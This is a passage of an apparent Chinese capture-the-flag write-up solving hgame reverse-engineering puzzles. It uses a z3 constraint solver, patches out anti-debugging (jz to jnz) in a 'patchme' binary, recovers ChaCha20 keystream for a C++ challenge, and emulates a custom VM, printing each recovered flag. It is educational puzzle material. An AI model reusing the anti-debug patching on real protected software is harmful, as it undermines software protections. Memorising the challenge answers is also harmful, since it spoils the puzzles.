6732474)solver.add( num[0] - 42567 + num[1] - 17743 + num[2] * 47827 + num[3] - 10246 + (num[4] ^ 0x3F9C) + num[5] + 39390 + num[ 6] * 11803 + num[7] * 60332 + (num[8] ^ 0x483B) + (num[9] ^ 0x12BB) + num[10] - 25636 + num[11] - 16780 + num[ 12] - 62345 == 14020739)solver.add(num[0] - 10968 + num[1] - 31780 + (num[2] ^ 0x7C71) + num[3] - 61983 + num[4] * 31048 + num[5] * 20189 + num[ 6] + 12337 + num[7] * 25945 + (num[8] ^ 0x1B98) + num[9] - 25369 + num[10] - 54893 + num[11] * 59949 + ( num[12] ^ 0x3099) == 14434062)solver.add(num[0] + 16689 + num[1] - 10279 + num[2] - 32918 + num[3] - 57155 + num[4] * 26571 + num[5] * 15086 + ( num[6] ^ 0x59CA) + (num[7] ^ 0x5B35) + (num[8] ^ 0x3FFD) + (num[9] ^ 0x5A85) + num[10] - 40224 + num[ 11] + 31751 + num[12] * 8421 == 7433598)solver.add( num[0] + 28740 + num[1] - 64696 + num[2] + 60470 + num[3] - 14752 + (num[4] ^ 0x507) + (num[5] ^ 0x89C8) + num[ 6] + 49467 + num[7] - 33788 + num[8] + 20606 + (num[9] ^ 0xAF4A) + num[10] * 19764 + num[11] + 48342 + num[ 12] * 56511 == 7989404)solver.add((num[0] ^ 0x7132) + num[1] + 23120 + num[2] + 22802 + num[3] * 31533 + (num[4] ^ 0x9977) + num[5] - 48576 + ( num[6] ^ 0x6F7E) + num[7] - 43265 + num[8] + 22365 + num[9] + 61108 + num[10] * 2823 + num[11] - 30343 + num[12] + 14780 == 3504803)solver.add( num[0] * 22466 + (num[1] ^ 0xDABF) + num[2] - 53658 + (num[3] ^ 0xB838) + (num[4] ^ 0x30DF) + num[5] * 59807 + num[ 6] + 46242 + num[7] + 3052 + (num[8] ^ 0x62BF) + num[9] + 30202 + num[10] * 22698 + num[11] + 33480 + ( num[12] ^ 0x4175) == 11003580)solver.add( num[0] * 57492 + (num[1] ^ 0x346D) + num[2] - 13941 + (num[3] ^ 0xBBDC) + num[4] * 38310 + num[5] + 9884 + num[ 6] - 45500 + num[7] - 19233 + num[8] + 58274 + num[9] + 36175 + (num[10] ^ 0x4888) + num[11] * 49694 + ( num[12] ^ 0x2501) == 25546210)solver.add(num[0] - 23355 + num[1] * 50164 + (num[2] ^ 0x873A) + num[3] + 52703 + num[4] + 36245 + num[5] * 46648 + ( num[6] ^ 0x12FA) + (num[7] ^ 0xA376) + num[8] * 27122 + (num[9] ^ 0xA44A) + num[10] * 15676 + num[ 11] - 31863 + num[12] + 62510 == 11333836)solver.add( num[0] * 30523 + (num[1] ^ 0x1F36) + num[2] + 39058 + num[3] * 57549 + (num[4] ^ 0xD0C0) + num[5] * 4275 + num[ 6] - 48863 + (num[7] ^ 0xD88C) + (num[8] ^ 0xA40) + (num[9] ^ 0x3554) + num[10] + 62231 + num[11] + 19456 + num[ 12] - 13195 == 13863722)solver.add(num[0] == 236, num[1] == 72, num[2] == 213, num[3] == 106, num[4] == 189, num[5] == 86)if solver.check() == sat: m = solver.model() for i in range(len(m)): print('num[%d]' % i, '=', int(str(m[num[i]])))else: print('unsat')'''num[0] = 236num[1] = 72num[2] = 213num[3] = 106num[4] = 189num[5] = 86num[6] = 62num[7] = 53num[8] = 120num[9] = 199num[10] = 15num[11] = 93num[12] = 133'''最后得到 flag num = [0 for i in range(13)]num[0] = 236num[1] = 72num[2] = 213num[3] = 106num[4] = 189num[5] = 86num[6] = 62num[7] = 53num[8] = 120num[9] = 199num[10] = 15num[11] = 93num[12] = 133array = [132, 47, 180, 7, 216, 45, 68, 6, 39, 246, 124, 2, 243, 137, 58, 172, 53, 200, 99, 91, 83, 13, 171, 80, 108, 235, 179, 58, 176, 28, 216, 36, 11, 80, 39, 162, 97, 58, 236, 130, 123, 176, 24, 212, 56, 89, 72]for i in range(len(array)): print(chr(array[i] ^ num[i % len(num)]),end='')# hgame&#123;z3_1s_very_u5eful_1n_rever5e_engin3ering&#125;# patchme 先过一下反调试，jz 改成 jnz 让 ida 在调试状态不退出 此处使用 mprotect, 将一段内存区域标记为可读可写可执行，然后经过异或解密，所以可以直接去看这段解密后的代码 void __noreturn sub_56092A0864CA()&#123; __WAIT_STATUS stat_loc; // [rsp+Ch] [rbp-2C4h] BYREF int i; // [rsp+14h] [rbp-2BCh] __int64 v2; // [rsp+18h] [rbp-2B8h] int pipedes[2]; // [rsp+20h] [rbp-2B0h] BYREF int v4[2]; // [rsp+28h] [rbp-2A8h] BYREF char *argv[4]; // [rsp+30h] [rbp-2A0h] BYREF char v6[48]; // [rsp+50h] [rbp-280h] BYREF __int64 v7; // [rsp+80h] [rbp-250h] __int64 v8[5]; // [rsp+E0h] [rbp-1F0h] int v9; // [rsp+108h] [rbp-1C8h] __int16 v10; // [rsp+10Ch] [rbp-1C4h] char v11; // [rsp+10Eh] [rbp-1C2h] __int64 v12[5]; // [rsp+110h] [rbp-1C0h] int v13; // [rsp+138h] [rbp-198h] __int16 v14; // [rsp+13Ch] [rbp-194h] char v15; // [rsp+13Eh] [rbp-192h] char buf[80]; // [rsp+140h] [rbp-190h] BYREF char s1[8]; // [rsp+190h] [rbp-140h] BYREF __int64 v18; // [rsp+198h] [rbp-138h] char v19[280]; // [rsp+1A0h] [rbp-130h] BYREF int v20; // [rsp+2B8h] [rbp-18h] unsigned __int64 v21; // [rsp+2C8h] [rbp-8h] v21 = __readfsqword(0x28u); if ( dword_56092A089028 &lt;= 1 ) &#123; pipe(pipedes); pipe(v4); if ( fork() ) &#123; close(pipedes[0]); close(v4[1]); HIDWORD(stat_loc.__iptr) = 0; while ( SHIDWORD(stat_loc.__iptr) &lt;= 35 ) &#123; buf[2 * HIDWORD(stat_loc.__iptr)] = 37; buf[2 * HIDWORD(stat_loc.__iptr)++ + 1] = 110; &#125; buf[72] = 10; buf[73] = 0; write(pipedes[1], buf, 0x4AuLL); *(_QWORD *)s1 = 0LL; v18 = 0LL; memset(v19, 0, sizeof(v19)); v20 = 0; read(v4[0], s1, 0x12CuLL); wait((__WAIT_STATUS)&amp;stat_loc); if ( !LODWORD(stat_loc.__uptr) &amp;&amp; !strncmp(s1, buf, 0x14uLL) ) &#123; v8[0] = 0x5416D999808A28FALL; v8[1] = 0x588505094953B563LL; v8[2] = 0xCE8CF3A0DC669097LL; v8[3] = 0x4C5CF3E854F44CBDLL; v8[4] = 0xD144E49916678331LL; v9 = -631149652; v10 = -17456; v11 = 85; v12[0] = 0x3B4FA2FCEDEB4F92LL; v12[1] = 0x7E45A6C3B67EA16LL; v12[2] = 0xAFE1ACC8BF12D0E7LL; v12[3] = 0x132EC3B7269138CELL; v12[4] = 0x8E2197EB7311E643LL; v13 = -1370223935; v14 = -13899; v15 = 40; putchar(10); for ( i = 0; i &lt;= 46; ++i ) putchar((char)(*((_BYTE *)v8 + i) ^ *((_BYTE *)v12 + i))); &#125; else &#123; puts(\"\\nthere are still bugs...\"); &#125; &#125; else &#123; fflush(stdin); close(pipedes[1]); close(v4[0]); dup2(pipedes[0], 0); dup2(v4[1], 1); dup2(v4[1], 2); argv[0] = *(char **)qword_56092A089020; argv[1] = (char *)&amp;unk_56092A087025; argv[2] = 0LL; sub_56092A086AA0(*(_QWORD *)qword_56092A089020, v6); v2 = v7; if ( v7 == 14472 ) execve(*(const char **)qword_56092A089020, argv, 0LL); else puts(\"\\nyou cannot modify the file size\"); &#125; &#125;&#125;逻辑很清楚，直接写 exp 就行了 v8 = [0 for i in range(8)]v8[0] = 0x5416D999808A28FAv8[1] = 0x588505094953B563v8[2] = 0xCE8CF3A0DC669097v8[3] = 0x4C5CF3E854F44CBDv8[4] = 0xD144E49916678331v8[5] = -631149652v8[6] = -17456v8[7] = 85v12 = [0 for i in range(8)]v12[0] = 0x3B4FA2FCEDEB4F92v12[1] = 0x7E45A6C3B67EA16v12[2] = 0xAFE1ACC8BF12D0E7v12[3] = 0x132EC3B7269138CEv12[4] = 0x8E2197EB7311E643v12[5] = -1370223935v12[6] = -13899v12[7] = 40for i in range(len(v8)): a = v8[i] ^ v12[i] print(bytearray.fromhex(hex(a)[2::]).decode()[::-1], end='') # hgame&#123;You_4re_a_p@tch_master_0r_reverse_ma5ter&#125;# cpp 通过这些数据可以确定是 chacha20 算法 通过动态调试得知 chacha20 的 key 为 hgame&#123;th , counter 为 0x12345678 , nonce 为 ['h','g','a'] 但是把数据放到 chacha20 算法里面却不能输出 flag 所以我直接找到对矩阵进行操作的函数， 并且得到了最终的矩阵 exp 如下 import numpy as npimport structimport hashlibimport warningsfrom ctypes import *# ChaCha20 Matrix: 16 words, 32-bits each (4 bytes each) for a total of 64-bytes# cccccccc cccccccc cccccccc cccccccc #constants# kkkkkkkk kkkkkkkk kkkkkkkk kkkkkkkk #key# kkkkkkkk kkkkkkkk kkkkkkkk kkkkkkkk #key# bbbbbbbb nnnnnnnn nnnnnnnn nnnnnnnn #block_number and nonce# Disable overflow warnings for numpy uint as we need the overflow in ChaCha20's additionwarnings.filterwarnings(\"ignore\")def quarterround(a, b, c, d): def circular_left(num, i): return ((num &lt;&lt; i) &amp; 0xFFFFFFFF) | (num >> (32 - i)) # a, b, c, d are numpy uint32. The addition may overflow which is ok for ChaCha20 a += b d ^= a d = circular_left(d, 16) c += d b ^= c b = circular_left(b, 12) a += b d ^= a d = circular_left(d, 8) c += d b ^= c b = circular_left(b, 7) return (a, b, c, d)def rounds(block): steps = [ [0, 4, 8, 12], [1, 5, 9, 13], [2, 6, 10, 14], [3, 7, 11, 15], [0, 5, 10, 15], [1, 6, 11, 12], [2, 7, 8, 13], [3, 4, 9, 14], ] # print(type(block)) for _ in range(10): for round in steps: block[round] = quarterround(*(block[round])) return blockdef _xor(data_1, data_2): return [a ^ b for a, b in zip(data_1, data_2)]def encrypt(plaintext): ''' global matrix # Add the 4-byte block number # matrix[12] = counter state = matrix.copy() state = rounds(state) # Create the final state final = state + matrix # Serialize the final state # print(hex(c_uint32(final[0]).value)) ''' final = np.array( [0x4037A04E, 0xFDDA0246, 0x3C6EFA21, 0xCF9CD9AF, 0x673347B9, 0x0DEC4EE0, 0x1380C4D1, 0x3AB2A932, 0x025D50A7, 0x834A3982, 0xCB6EA25F, 0xA26BA4AB, 0xA1C42135, 0xD1063EBA, 0x2397FEFC, 0x55C7D126], dtype=np.uint32) serial_out = struct.pack(\"&lt;16L\", *final) ciphertext = bytes(_xor(serial_out, plaintext)) return ciphertextdef decrypt(ciphertext): return encrypt(ciphertext)'''matrix = np.array( [0x61707865, 0x3320646E, 0x79622D32, 0x6B206574, 0x00000068, 0x00000067, 0x00000061, 0x0000006D, 0x00000065, 0x0000007B, 0x00000074, 0x00000068, 0x12345678, 0x00000068, 0x00000067, 0x00000061], dtype=np.uint32)'''_ciphertext = [40, 80, -63, 35, -104, -95, 65, 54, 76, 49, -53, 82, -112, -15, -84, -52, 15, 108, 42, -119, 127, -33, 17, -124, 127, -26, -94, -32, 89, -57, -59, 70, 93, 41, 56, -109, -19, 21, 122, -1]ciphertext = [0 for _ in range(40)]for i in range(0, len(_ciphertext), 4): ciphertext[i] = _ciphertext[i + 3] ciphertext[i + 1] = _ciphertext[i + 2] ciphertext[i + 2] = _ciphertext[i + 1] ciphertext[i + 3] = _ciphertext[i]# print(ciphertext)for i in range(len(ciphertext)): if ciphertext[i] &lt; 0: ciphertext[i] += 256ciphertext = bytearray(ciphertext)flag = decrypt(ciphertext)for i in range(0, len(_ciphertext), 4): print(chr(flag[i+3]),chr(flag[i+2]),chr(flag[i+1]),chr(flag[i]),end='',sep='')# hgame&#123;Cpp_1s_much_m0r3_dlff1cult_th4n_C&#125;# week4 # vm 写个正向的代码 #include&lt;stdio.h>unsigned char key[1008] = &#123; 0x00, 0x03, 0x02, 0x00, 0x03, 0x00, 0x02, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x01, 0x00, 0x00, 0x03, 0x02, 0x32, 0x03, 0x00, 0x02, 0x03, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x03, 0x02, 0x64, 0x03, 0x00, 0x02, 0x03, 0x00, 0x00, 0x00, 0x00, 0x03, 0x03, 0x01, 0x00, 0x00, 0x03, 0x00, 0x08, 0x00, 0x02, 0x02, 0x01, 0x03, 0x04, 0x01, 0x00, 0x03, 0x05, 0x02, 0x00, 0x03, 0x00, 0x01, 0x02, 0x00, 0x02, 0x00, 0x01, 0x01, 0x00, 0x00, 0x03, 0x00, 0x01, 0x03, 0x00, 0x03, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x03, 0x01, 0x28, 0x04, 0x06, 0x5F, 0x05, 0x00, 0x00, 0x03, 0x03, 0x00, 0x02, 0x01, 0x00, 0x03, 0x02, 0x96, 0x03, 0x00, 0x02, 0x03, 0x00, 0x00, 0x00, 0x00, 0x04, 0x07, 0x88, 0x00, 0x03, 0x00, 0x01, 0x03, 0x00, 0x03, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x03, 0x01, 0x28, 0x04, 0x07, 0x63, 0xFF, 0xFF&#125;;unsigned int input[200] = &#123; 0x00000030, 0x00000031, 0x00000032, 0x00000033, 0x00000034, 0x00000035, 0x00000036, 0x00000037, 0x00000038, 0x00000039, 0x00000030, 0x00000031, 0x00000032, 0x00000033, 0x00000034, 0x00000035, 0x00000036, 0x00000037, 0x00000038, 0x00000039, 0x00000030, 0x00000031, 0x00000032, 0x00000033, 0x00000034, 0x00000035, 0x00000036, 0x00000037, 0x00000038, 0x00000039, 0x00000030, 0x00000031, 0x00000032, 0x00000033, 0x00000034, 0x00000035, 0x00000036, 0x00000037, 0x00000038, 0x00000039, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x0000009B, 0x000000A8, 0x00000002, 0x000000BC, 0x000000AC, 0x0000009C, 0x000000CE, 0x000000FA, 0x00000002, 0x000000B9, 0x000000FF, 0x0000003A, 0x00000074, 0x00000048, 0x00000019, 0x00000069, 0x000000E8, 0x00000003, 0x000000CB, 0x000000C9, 0x000000FF, 0x000000FC, 0x00000080, 0x000000D6, 0x0000008D, 0x000000D7, 0x00000072, 0x00000000, 0x000000A7, 0x0000001D, 0x0000003D, 0x00000099, 0x00000088, 0x00000099, 0x000000BF, 0x000000E8, 0x00000096, 0x0000002E, 0x0000005D, 0x00000057, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x000000C9, 0x000000A9, 0x000000BD, 0x0000008B, 0x00000017, 0x000000C2, 0x0000006E, 0x000000F8, 0x000000F5, 0x0000006E, 0x00000063, 0x00000063, 0x000000D5, 0x00000046, 0x0000005D, 0x00000016, 0x00000098, 0x00000038, 0x00000030, 0x00000073, 0x00000038, 0x000000C1, 0x0000005E, 0x000000ED, 0x000000B0, 0x00000029, 0x0000005A, 0x00000018, 0x00000040, 0x000000A7, 0x000000FD, 0x0000000A, 0x0000001E, 0x00000078, 0x0000008B, 0x00000062, 0x000000DB, 0x0000000F, 0x0000008F, 0x0000009C, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00004800, 0x0000F100, 0x00004000, 0x00002100, 0x00003501, 0x00006400, 0x00007801, 0x0000F900, 0x00001801, 0x00005200, 0x00002500, 0x00005D01, 0x00004700, 0x0000FD00, 0x00006901, 0x00005C00, 0x0000AF01, 0x0000B200, 0x0000EC01, 0x00005201, 0x00004F01, 0x00001A01, 0x00005000, 0x00008501, 0x0000CD00, 0x00002300, 0x0000F800, 0x00000C00, 0x0000CF00, 0x00003D01, 0x00004501, 0x00008200, 0x0000D201, 0x00002901, 0x0000D501, 0x00000601, 0x0000A201, 0x0000DE00, 0x0000A601, 0x0000CA01, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000&#125;;int a1[9] = &#123; 0 &#125;;int reg[80] = &#123; 0 &#125;;int main() &#123; int count = 1,count_func5 = 1; while (key[a1[6]] != 255) &#123; printf(\"count:%d, call func%d, \",count++, key[a1[6]]); switch (key[a1[6]]) &#123; case 0u: printf(\"run opcode: %d %d %d %d\", key[a1[6]], key[a1[6] + 1], key[a1[6] + 2], key[a1[6] + 3]); if (key[a1[6] + 1]) &#123; switch (key[a1[6] + 1]) &#123; case 1u: printf(\",input[%d] = a1[0]\", a1[2]); input[a1[2]] = a1[0]; break; case 2u: printf(\", a1[%d] = a1[%d]\", key[a1[6] + 2],key[a1[6] + 3]); a1[key[a1[6] + 2]] = a1[key[a1[6] + 3]]; break; case 3u: printf(\", a1[%d] = %d\", key[a1[6] + 2], key[a1[6] + 3]); a1[key[a1[6] + 2]] = key[a1[6] + 3]; break; &#125; &#125; else &#123; printf(\", a1[0] = input[%d]\", a1[2]); a1[0] = input[a1[2]]; &#125; a1[6] = a1[6] + 4; printf(\", a1[0~3] = %d, %d, %d, %d\", a1[0], a1[1], a1[2], a1[3]); break; case 1u: printf(\"run opcode: %d %d\", key[a1[6]], key[a1[6] + 1]); if (key[a1[6] + 1]) &#123; switch (key[a1[6] + 1]) &#123; case 1u: reg[++a1[7]] = a1[0]; break; case 2u: reg[++a1[7]] = a1[2]; break; case 3u: reg[++a1[7]] = a1[3]; break; &#125; &#125; else &#123; reg[++a1[7]] = a1[0]; &#125; a1[6] = a1[6] + 2; break; case 2u: printf(\"run opcode: %d %d\", key[a1[6]], key[a1[6] + 1]); if (key[a1[6] + 1]) &#123; switch (key[a1[6] + 1]) &#123; case 1u: a1[1] = reg[a1[7]--]; break; case 2u: a1[2] = reg[a1[7]--]; break; case 3u: a1[3] = reg[a1[7]--]; break; &#125; &#125; else &#123; a1[0] = reg[a1[7]--]; &#125; a1[6] = a1[6] + 2; break; case 3u: printf(\"run opcode: %d %d %d %d\", key[a1[6]], key[a1[6] + 1], key[a1[6] + 2], key[a1[6] + 3]); switch (key[a1[6] + 1]) &#123; case 0u: printf(\", a1[%d] = a1[%d] + a1[%d]\", key[a1[6] + 2], key[a1[6] + 2], key[a1[6] + 3]); a1[key[a1[6] + 2]] += a1[key[a1[6] + 3]]; break; case 1u: printf(\", a1[%d] = a1[%d] - a1[%d]\", key[a1[6] + 2], key[a1[6] + 2], key[a1[6] + 3]); a1[key[a1[6] + 2]] -= a1[key[a1[6] + 3]]; break; case 2u: printf(\", a1[%d] = a1[%d] * a1[%d]\", key[a1[6] + 2], key[a1[6] + 2], key[a1[6] + 3]); a1[key[a1[6] + 2]] *= a1[key[a1[6] + 3]]; break; case 3u: printf(\", a1[%d] = a1[%d] ^ a1[%d]\", key[a1[6] + 2], key[a1[6] + 2], key[a1[6] + 3]); a1[key[a1[6] + 2]] ^= a1[key[a1[6] + 3]]; break; case 4u: printf(\", a1[%d] = (a1[%d] &lt;&lt; a1[%d])&amp;0xFF00\", key[a1[6] + 2], key[a1[6] + 2], key[a1[6] + 3]); a1[key[a1[6] + 2]] &lt;&lt;= a1[key[a1[6] + 3]]; a1[key[a1[6] + 2]] &amp;= 0xFF00u; break; case 5u: printf(\", a1[%d] = a1[%d] >> a1[%d]\", key[a1[6] + 2], key[a1[6] + 2], key[a1[6] + 3]); a1[key[a1[6] + 2]] >>= a1[key[a1[6] + 3]]; break; default: break; &#125; a1[6] = a1[6] + 4; printf(\", a1[0~3] = %d, %d, %d, %d\", a1[0], a1[1], a1[2], a1[3]); break; case 4u: printf(\"run opcode: %d\", key[a1[6]]); if (a1[0] == a1[1]) a1[8] = 0; if (a1[0] != a1[1]) a1[8] = 1; a1[6] = a1[6] + 1; break; case 5u: printf(\"run opcode: %d, \", key[a1[6]]); printf(\"change the opcode position from %d to %d, func5 count: %d\", a1[6], key[a1[6] + 1], count_func5++); a1[6] = key[a1[6] + 1]; break; case 6u: printf(\"run opcode: %d, \", key[a1[6]]); if (a1[8]) &#123; printf(\"change the opcode position from %d to %d\", a1[6], a1[6] + 2); a1[6] = (a1[6] + 2); &#125; else &#123; printf(\"change the opcode position from %d to %d\", a1[6], key[a1[6] + 1]); a1[6] = key[a1[6] + 1]; &#125; break; case 7u: printf(\"run opcode: %d, \", key[a1[6]]); if (a1[8]) &#123; printf(\"change the opcode position from %d to %d\", a1[6], key[a1[6] + 1]); a1[6] = key[a1[6] + 1]; &#125; else &#123; printf(\"change the opcode position from %d to %d\", a1[6], a1[6] + 2); a1[6] = (a1[6] + 2); &#125; break; default: break; &#125; printf(\"\\n\"); &#125;&#125;部分输出如下 count:1, call func0, run opcode: 0 3 2 0, a1[2] = 0, a1[0~3] = 0, 0, 0, 0count:2, call func3, run opcode: 3 0 2 3, a1[2] = a1[2] + a1[3], a1[0~3] = 0, 0, 0, 0count:3, call func0, run opcode: 0 0 0 0, a1[0] = input[0], a1[0~3] = 48, 0, 0, 0count:4, call func0, run opcode: 0 2 1 0, a1[1] = a1[0], a1[0~3] = 48, 48, 0, 0count:5, call func0, run opcode: 0 3 2 50, a1[2] = 50, a1[0~3] = 48, 48, 50, 0count:6, call func3, run opcode: 3 0 2 3, a1[2] = a1[2] + a1[3], a1[0~3] = 48, 48, 50, 0count:7, call func0, run opcode: 0 0 0 0, a1[0] = input[50], a1[0~3] = 155, 48, 50, 0count:8, call func3, run opcode: 3 0 1 0, a1[1] = a1[1] + a1[0], a1[0~3] = 155, 203, 50, 0count:9, call func0, run opcode: 0 3 2 100, a1[2] = 100, a1[0~3] = 155, 203, 100, 0count:10, call func3, run opcode: 3 0 2 3, a1[2] = a1[2] + a1[3], a1[0~3] = 155, 203, 100, 0count:11, call func0, run opcode: 0 0 0 0, a1[0] = input[100], a1[0~3] = 201, 203, 100, 0count:12, call func3, run opcode: 3 3 1 0, a1[1] = a1[1] ^ a1[0], a1[0~3] = 201, 2, 100, 0count:13, call func0, run opcode: 0 3 0 8, a1[0] = 8, a1[0~3] = 8, 2, 100, 0count:14, call func0, run opcode: 0 2 2 1, a1[2] = a1[1], a1[0~3] = 8, 2, 2, 0count:15, call func3, run opcode: 3 4 1 0, a1[1] = (a1[1] &lt;&lt; a1[0])&amp;0xFF00, a1[0~3] = 8, 512, 2, 0count:16, call func3, run opcode: 3 5 2 0, a1[2] = a1[2] >> a1[0], a1[0~3] = 8, 512, 0, 0count:17, call func3, run opcode: 3 0 1 2, a1[1] = a1[1] + a1[2], a1[0~3] = 8, 512, 0, 0count:18, call func0, run opcode: 0 2 0 1, a1[0] = a1[1], a1[0~3] = 512, 512, 0, 0count:19, call func1, run opcode: 1 0count:20, call func0, run opcode: 0 3 0 1, a1[0] = 1, a1[0~3] = 1, 512, 0, 0count:21, call func3, run opcode: 3 0 3 0, a1[3] = a1[3] + a1[0], a1[0~3] = 1, 512, 0, 1count:22, call func0, run opcode: 0 2 0 3, a1[0] = a1[3], a1[0~3] = 1, 512, 0, 1count:23, call func0, run opcode: 0 3 1 40, a1[1] = 40, a1[0~3] = 1, 40, 0, 1count:24, call func4, run opcode: 4count:25, call func6, run opcode: 6, change the opcode position from 91 to 93count:26, call func5, run opcode: 5, change the opcode position from 93 to 0, func5 count: 1count:27, call func0, run opcode: 0 3 2 0, a1[2] = 0, a1[0~3] = 1, 40, 0, 1count:28, call func3, run opcode: 3 0 2 3, a1[2] = a1[2] + a1[3], a1[0~3] = 1, 40, 1, 1count:29, call func0, run opcode: 0 0 0 0, a1[0] = input[1], a1[0~3] = 49, 40, 1, 1count:30, call func0, run opcode: 0 2 1 0, a1[1] = a1[0], a1[0~3] = 49, 49, 1, 1count:31, call func0, run opcode: 0 3 2 50, a1[2] = 50, a1[0~3] = 49, 49, 50, 1count:32, call func3, run opcode: 3 0 2 3, a1[2] = a1[2] + a1[3], a1[0~3] = 49, 49, 51, 1count:33, call func0, run opcode: 0 0 0 0, a1[0] = input[51], a1[0~3] = 168, 49, 51, 1count:34, call func3, run opcode: 3 0 1 0, a1[1] = a1[1] + a1[0], a1[0~3] = 168, 217, 51, 1count:35, call func0, run opcode: 0 3 2 100, a1[2] = 100, a1[0~3] = 168, 217, 100, 1count:36, call func3, run opcode: 3 0 2 3, a1[2] = a1[2] + a1[3], a1[0~3] = 168, 217, 101, 1count:37, call func0, run opcode: 0 0 0 0, a1[0] = input[101], a1[0~3] = 169, 217, 101, 1count:38, call func3, run opcode: 3 3 1 0, a1[1] = a1[1] ^ a1[0], a1[0~3] = 169, 112, 101, 1count:39, call func0, run opcode: 0 3 0 8, a1[0] = 8, a1[0~3] = 8, 112, 101, 1count:40, call func0, run opcode: 0 2 2 1, a1[2] = a1[1], a1[0~3] = 8, 112, 112, 1count:41, call func3, run opcode: 3 4 1 0, a1[1] = (a1[1] &lt;&lt; a1[0])&amp;0xFF00, a1[0~3] = 8, 28672, 112, 1count:42, call func3, run opcode: 3 5 2 0, a1[2] = a1[2] >> a1[0], a1[0~3] = 8, 28672, 0, 1count:43, call func3, run opcode: 3 0 1 2, a1[1] = a1[1] + a1[2], a1[0~3] = 8, 28672, 0, 1count:44, call func0, run opcode: 0 2 0 1, a1[0] = a1[1], a1[0~3] = 28672, 28672, 0, 1count:45, call func1, run opcode: 1 0count:46, call func0, run opcode: 0 3 0 1, a1[0] = 1, a1[0~3] = 1, 28672, 0, 1count:47, call func3, run opcode: 3 0 3 0, a1[3] = a1[3] + a1[0], a1[0~3] = 1, 28672, 0, 2count:48, call func0, run opcode: 0 2 0 3, a1[0] = a1[3], a1[0~3] = 2, 28672, 0, 2count:49, call func0, run opcode: 0 3 1 40, a1[1] = 40, a1[0~3] = 2, 40, 0, 2count:50, call func4, run opcode: 4count:51, call func6, run opcode: 6, change the opcode position from 91 to 93count:52, call func5, run opcode: 5, change the opcode position from 93 to 0, func5 count: 2...............count:1015, call func0, run opcode: 0 3 2 0, a1[2] = 0, a1[0~3] = 39, 40, 0, 39count:1016, call func3, run opcode: 3 0 2 3, a1[2] = a1[2] + a1[3], a1[0~3] = 39, 40, 39, 39count:1017, call func0, run opcode: 0 0 0 0, a1[0] = input[39], a1[0~3] = 57, 40, 39, 39count:1018, call func0, run opcode: 0 2 1 0, a1[1] = a1[0], a1[0~3] = 57, 57, 39, 39count:1019, call func0, run opcode: 0 3 2 50, a1[2] = 50, a1[0~3] = 57, 57, 50, 39count:1020, call func3, run opcode: 3 0 2 3, a1[2] = a1[2] + a1[3], a1[0~3] = 57, 57, 89, 39count:1021, call func0, run opcode: 0 0 0 0, a1[0] = input[89], a1[0~3] = 87, 57, 89, 39count:1022, call func3, run opcode: 3 0 1 0, a1[1] = a1[1] + a1[0], a1[0~3] = 87, 144, 89, 39count:1023, call func0, run opcode: 0 3 2 100, a1[2] = 100, a1[0~3] = 87, 144, 100, 39count:1024, call func3, run opcode: 3 0 2 3, a1[2] = a1[2] + a1[3], a1[0~3] = 87, 144, 139, 39count:1025, call func0, run opcode: 0 0 0 0, a1[0] = input[139], a1[0~3] = 156, 144, 139, 39count:1026, call func3, run opcode: 3 3 1 0, a1[1] = a1[1] ^ a1[0], a1[0~3] = 156, 12, 139, 39count:1027, call func0, run opcode: 0 3 0 8, a1[0] = 8, a1[0~3] = 8, 12, 139, 39count:1028, call func0, run opcode: 0 2 2 1, a1[2] = a1[1], a1[0~3] = 8, 12, 12, 39count:1029, call func3, run opcode: 3 4 1 0, a1[1] = (a1[1] &lt;&lt; a1[0])&amp;0xFF00, a1[0~3] = 8, 3072, 12, 39count:1030, call func3, run opcode: 3 5 2 0, a1[2] = a1[2] >> a1[0], a1[0~3] = 8, 3072, 0, 39count:1031, call func3, run opcode: 3 0 1 2, a1[1] = a1[1] + a1[2], a1[0~3] = 8, 3072, 0, 39count:1032, call func0, run opcode: 0 2 0 1, a1[0] = a1[1], a1[0~3] = 3072, 3072, 0, 39count:1033, call func1, run opcode: 1 0count:1034, call func0, run opcode: 0 3 0 1, a1[0] = 1, a1[0~3] = 1, 3072, 0, 39count:1035, call func3, run opcode: 3 0 3 0, a1[3] = a1[3] + a1[0], a1[0~3] = 1, 3072, 0, 40count:1036, call func0, run opcode: 0 2 0 3, a1[0] = a1[3], a1[0~3] = 40, 3072, 0, 40count:1037, call func0, run opcode: 0 3 1 40, a1[1] = 40, a1[0~3] = 40, 40, 0, 40count:1038, call func4, run opcode: 4count:1039, call func6, run opcode: 6, change the opcode position from 91 to 95count:1040, call func0, run opcode: 0 3 3 0, a1[3] = 0, a1[0~3] = 40, 40, 0, 0count:1041, call func2, run opcode: 2 1count:1042, call func0, run opcode: 0 3 2 150, a1[2] = 150, a1[0~3] = 40, 3072, 150, 0count:1043, call func3, run opcode: 3 0 2 3, a1[2] = a1[2] + a1[3], a1[0~3] = 40, 3072, 150, 0count:1044, call func0, run opcode: 0 0 0 0, a1[0] = input[150], a1[0~3] = 18432, 3072, 150, 0count:1045, call func4, run opcode: 4count:1046, call func7, run opcode: 7, change the opcode position from 114 to 136用 python 简化一下 a = [0x9b, 0xa8, 0x2, 0xbc, 0xac, 0x9c, 0xce, 0xfa, 0x2, 0xb9, 0xff, 0x3a, 0x74, 0x48, 0x19, 0x69, 0xe8, 0x3, 0xcb, 0xc9, 0xff, 0xfc, 0x80, 0xd6, 0x8d, 0xd7, 0x72, 0x0, 0xa7, 0x1d, 0x3d, 0x99, 0x88, 0x99, 0xbf, 0xe8, 0x96, 0x2e, 0x5d, 0x57, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]b = [0xc9, 0xa9, 0xbd, 0x8b, 0x17, 0xc2, 0x6e, 0xf8, 0xf5, 0x6e, 0x63, 0x63, 0xd5, 0x46, 0x5d, 0x16, 0x98, 